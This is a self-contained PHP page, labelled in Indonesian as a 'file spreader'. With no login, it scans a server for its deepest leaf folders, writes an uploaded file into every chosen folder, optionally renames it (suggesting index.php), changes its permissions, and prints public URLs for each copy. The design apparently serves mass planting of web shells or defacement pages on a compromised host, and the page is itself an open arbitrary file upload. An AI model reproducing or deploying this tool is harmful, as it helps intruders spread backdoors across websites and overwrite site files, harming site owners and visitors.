<?php
// nebar.php - Tools Penebar File Sederhana

$message = "";
$scan_results = [];

// Fitur Scan Directory Paling Jauh (Leaf Directories)
if (isset($_POST['scan_deepest'])) {
    $root_path = isset($_POST['scan_root']) ? trim($_POST['scan_root']) : getcwd();
    
    if (is_dir($root_path)) {
        try {
            $all_dirs = [];
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($root_path, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );

            foreach ($iterator as $file) {
                if ($file->isDir()) {
                    $all_dirs[] = $file->getPathname();
                }
            }

            // Filter hanya folder yang tidak punya subfolder (Leaf)
            foreach ($all_dirs as $dir) {
                $is_leaf = true;
                foreach ($all_dirs as $check) {
                    // Cek apakah $check adalah anak dari $dir
                    if ($dir !== $check && strpos($check, $dir . DIRECTORY_SEPARATOR) === 0) {
                        $is_leaf = false;
                        break;
                    }
                }
                if ($is_leaf) {
                    $scan_results[] = $dir;
                }
            }
            
            if (empty($scan_results)) {
                // Jika tidak ada subfolder, mungkin root path itu sendiri adalah leaf
                $scan_results[] = realpath($root_path);
            }

            $message = "<div class='alert success'>Scan Berhasil! Ditemukan " . count($scan_results) . " folder terdalam (leaf directories).</div>";
        } catch (Exception $e) {
            $message = "<div class='alert error'>Error saat scanning: " . $e->getMessage() . "</div>";
        }
    } else {
        $message = "<div class='alert error'>Path root tidak valid atau tidak ditemukan.</div>";
    }
}

// Proses jika form disubmit
if (isset($_POST['submit'])) {
    $target_dirs = isset($_POST['dirs']) ? $_POST['dirs'] : [];
    
    // Cek apakah file diupload dan ada error
    if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == 0) {
        $file_name = $_FILES['upload_file']['name'];
        
        // Cek custom filename
        if (isset($_POST['custom_filename']) && !empty(trim($_POST['custom_filename']))) {
            $file_name = trim($_POST['custom_filename']);
        }

        $file_tmp = $_FILES['upload_file']['tmp_name'];
        $chmod_val = isset($_POST['chmod_val']) ? trim($_POST['chmod_val']) : '';

        // Filter empty paths
        $target_dirs = array_filter($target_dirs, function($value) { return !empty(trim($value)); });

        if (!empty($target_dirs) && !empty($file_tmp)) {
            // Baca konten file yang diupload
            $content = file_get_contents($file_tmp);
            $success_count = 0;
            $fail_count = 0;
            $failed_dirs = [];
            $success_links = [];

            foreach ($target_dirs as $dir) {
                $dir = trim($dir);
                // Pastikan itu adalah direktori
                if (is_dir($dir)) {
                    $destination = rtrim($dir, '/\\') . DIRECTORY_SEPARATOR . $file_name;
                    
                    // Coba tulis file ke tujuan
                    if (file_put_contents($destination, $content) !== false) {
                        // Jika chmod diisi, coba ubah permission
                        if (!empty($chmod_val)) {
                            // Konversi string octal ke integer octal
                            $mode = octdec($chmod_val);
                            @chmod($destination, $mode);
                        }
                        $success_count++;

                        // Generate Link
                        $doc_root = str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']);
                        $dest_path = str_replace('\\', '/', $destination);
                        $web_path = str_replace($doc_root, '', $dest_path);
                        // Ensure leading slash
                        if(substr($web_path, 0, 1) !== '/') $web_path = '/' . $web_path;
                        
                        $link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $web_path;
                        $success_links[] = "<a href='$link' target='_blank'>$link</a>";
                    } else {
                        $fail_count++;
                        $failed_dirs[] = htmlspecialchars($dir);
                    }
                } else {
                    $fail_count++;
                    $failed_dirs[] = htmlspecialchars($dir) . " (Bukan folder valid)";
                }
            }
            
            $msg_detail = $fail_count > 0 ? " <br>Gagal di: <ul><li>" . implode("</li><li>", $failed_dirs) . "</li></ul>" : "";
            $link_list = !empty($success_links) ? "<br><b>Sukses:</b><ul><li>" . implode("</li><li>", $success_links) . "</li></ul>" : "";
            $message = "<div class='alert success'>Berhasil menebar file <b>$file_name</b> ke $success_count folder.$link_list$msg_detail</div>";
        } else {
            $message = "<div class='alert error'>Harap masukkan minimal satu path folder tujuan!</div>";
        }
    } else {
        $message = "<div class='alert error'>Gagal mengupload file atau tidak ada file yang dipilih.</div>";
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tools Penebar File</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f4; padding: 20px; }
        .container { max-width: 700px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        h2 { margin-top: 0; color: #333; border-bottom: 2px solid #eee; padding-bottom: 10px; }
        .alert { padding: 15px; margin-bottom: 20px; border-radius: 4px; }
        .success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #555; }
        
        input[type="file"] { padding: 10px; background: #f8f9fa; border: 1px solid #ddd; width: 100%; box-sizing: border-box; margin-bottom: 10px; }
        
        .path-input-group { display: flex; gap: 10px; margin-bottom: 10px; }
        .path-input { flex-grow: 1; padding: 10px; border: 1px solid #ddd; border-radius: 4px; }
        .btn-remove { background-color: #dc3545; color: white; border: none; padding: 0 15px; border-radius: 4px; cursor: pointer; }
        .btn-remove:hover { background-color: #c82333; }

        .btn-add { background-color: #28a745; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; margin-bottom: 15px; display: inline-block; }
        .btn-add:hover { background-color: #218838; }

        button[type="submit"] { background-color: #007bff; color: white; border: none; padding: 12px 25px; font-size: 16px; border-radius: 4px; cursor: pointer; width: 100%; }
        button[type="submit"]:hover { background-color: #0056b3; }
    </style>
</head>
<body>

<div class="container">
    <h2>Tools Penebar File</h2>
    
    <?php echo $message; ?>

    <!-- Form Scanner -->
    <div style="background: #e9ecef; padding: 15px; border-radius: 4px; margin-bottom: 20px; border: 1px solid #dee2e6;">
        <h3 style="margin-top: 0; font-size: 18px;">🔍 Scan Folder Terdalam</h3>
        <form method="post">
            <div class="form-group" style="margin-bottom: 0;">
                <label>Root Directory untuk Scan:</label>
                <div style="display: flex; gap: 10px;">
                    <input type="text" name="scan_root" value="<?php echo isset($_POST['scan_root']) ? htmlspecialchars($_POST['scan_root']) : getcwd(); ?>" class="path-input" style="flex-grow: 1;">
                    <button type="submit" name="scan_deepest" style="width: auto; background-color: #17a2b8; padding: 10px 20px;">Mulai Scan</button>
                </div>
                <small style="color: #666;">Fitur ini akan mencari semua folder yang berada di ujung (tidak punya subfolder lagi) mulai dari path di atas.</small>
            </div>
        </form>

        <?php if (!empty($scan_results)): ?>
            <div style="margin-top: 15px; border-top: 1px solid #ccc; padding-top: 10px;">
                <h4>Hasil Scan (<?php echo count($scan_results); ?> folder):</h4>
                <div style="max-height: 200px; overflow-y: auto; background: #fff; border: 1px solid #ddd; padding: 10px; margin-bottom: 10px;">
                    <label style="margin-bottom: 5px; border-bottom: 1px solid #eee; padding-bottom: 5px; display:block;">
                        <input type="checkbox" id="select-all-scan"> <b>Pilih Semua</b>
                    </label>
                    <?php foreach ($scan_results as $i => $dir): ?>
                        <label style="display: block; font-weight: normal; margin-bottom: 3px;">
                            <input type="checkbox" class="scan-checkbox" value="<?php echo htmlspecialchars($dir); ?>"> 
                            <?php echo htmlspecialchars($dir); ?>
                        </label>
                    <?php endforeach; ?>
                </div>
                <button type="button" id="add-selected-btn" style="background-color: #6c757d; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer;">⬇️ Masukkan ke Daftar Target</button>
            </div>
        <?php endif; ?>
    </div>

    <form method="post" enctype="multipart/form-data">
        <div class="form-group">
            <label>1. Upload File yang akan ditebar:</label>
            <input type="file" name="upload_file" required>
        </div>

        <div class="form-group">
            <label>Nama File Baru (Opsional):</label>
            <input type="text" name="custom_filename" placeholder="Contoh: index.php (Biarkan kosong jika ingin pakai nama asli)" style="padding: 10px; border: 1px solid #ddd; width: 100%; box-sizing: border-box;">
        </div>

        <div class="form-group">
            <label>Opsional: Set Permission (Chmod):</label>
            <input type="text" name="chmod_val" placeholder="Contoh: 0644 atau 0755" style="padding: 10px; border: 1px solid #ddd; width: 100%; box-sizing: border-box;">
            <small style="color: #666;">Biarkan kosong jika tidak ingin mengubah permission.</small>
        </div>

        <div class="form-group">
            <label>2. Masukkan Path Folder Tujuan:</label>
            <div id="path-container">
                <div class="path-input-group">
                    <input type="text" name="dirs[]" placeholder="C:\xampp\htdocs\folder1 atau /var/www/html/folder1" class="path-input">
                </div>
            </div>
            <button type="button" id="add-path-btn" class="btn-add">+ Tambah Path</button>
        </div>

        <button type="submit" name="submit">🚀 Tebar File Sekarang</button>
    </form>
</div>

<script>
    document.getElementById('add-path-btn').addEventListener('click', function() {
        var container = document.getElementById('path-container');
        var div = document.createElement('div');
        div.className = 'path-input-group';
        
        var input = document.createElement('input');
        input.type = 'text';
        input.name = 'dirs[]';
        input.placeholder = 'Masukkan path folder...';
        input.className = 'path-input';
        
        var btnRemove = document.createElement('button');
        btnRemove.type = 'button';
        btnRemove.className = 'btn-remove';
        btnRemove.innerHTML = 'X';
        btnRemove.onclick = function() {
            container.removeChild(div);
        };

        div.appendChild(input);
        div.appendChild(btnRemove);
        container.appendChild(div);
    });

    var addSelectedBtn = document.getElementById('add-selected-btn');
    if (addSelectedBtn) {
        addSelectedBtn.addEventListener('click', function() {
            var checkboxes = document.querySelectorAll('.scan-checkbox:checked');
            var container = document.getElementById('path-container');
            
            if (checkboxes.length === 0) {
                alert('Pilih minimal satu folder dari hasil scan!');
                return;
            }

            // Cek input pertama, jika kosong pakai itu dulu
            var firstInput = container.querySelector('input[name="dirs[]"]');
            var startIndex = 0;
            
            if (firstInput && firstInput.value.trim() === '') {
                firstInput.value = checkboxes[0].value;
                startIndex = 1;
            }

            for (var i = startIndex; i < checkboxes.length; i++) {
                var div = document.createElement('div');
                div.className = 'path-input-group';
                
                var input = document.createElement('input');
                input.type = 'text';
                input.name = 'dirs[]';
                input.value = checkboxes[i].value;
                input.className = 'path-input';
                
                var btnRemove = document.createElement('button');
                btnRemove.type = 'button';
                btnRemove.className = 'btn-remove';
                btnRemove.innerHTML = 'X';
                btnRemove.onclick = function() {
                    this.parentNode.remove();
                };

                div.appendChild(input);
                div.appendChild(btnRemove);
                container.appendChild(div);
            }
            
            alert(checkboxes.length + ' folder berhasil ditambahkan ke daftar target.');
        });

        var selectAll = document.getElementById('select-all-scan');
        if (selectAll) {
            selectAll.addEventListener('change', function() {
                var checkboxes = document.querySelectorAll('.scan-checkbox');
                for(var i=0; i<checkboxes.length; i++) {
                    checkboxes[i].checked = this.checked;
                }
            });
        }
    }
</script>

</body>
</html>
